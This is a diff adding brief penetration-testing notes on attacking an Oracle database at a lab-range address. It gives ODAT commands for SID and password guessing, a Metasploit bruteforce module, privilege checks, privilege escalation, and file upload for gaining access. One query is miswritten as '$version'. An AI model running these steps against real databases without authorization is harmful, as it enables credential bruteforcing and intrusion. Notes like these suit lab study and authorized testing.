@@ -1,0 +1,19 @@
+python3 odat.py sidguesser -s 10.11.1.222
+
+To resolve issues on auxiliary/admin/oracle/oracle_login
+https://github.com/rapid7/metasploit-framework/issues/9870
+With the output use auxiliary/admin/oracle/oracle_login to bruteforce the credentials of this SID. or perform the following:
+python3 odat.py passwordguesser -s {HOST} -d {SID}
+
+Connect with sqlplus {USER}/{PASS}@{HOST}:{PORT}/{SID}
+Check version
+select * from $version;
+Check privs
+SELECT * FROM user_role_privs; 
+
+If the user is not a DBA try to escalate privileges
+
+python odat.py all -s {HOST} -d {SID} -U {USER} -P {PASS}
+
+check the output of the possible attacks.
+If you have DBMS_XSLPROCESSOR library is on yes you can upload files to the system and if you can get trought http or something the file, you will be able to gain access.
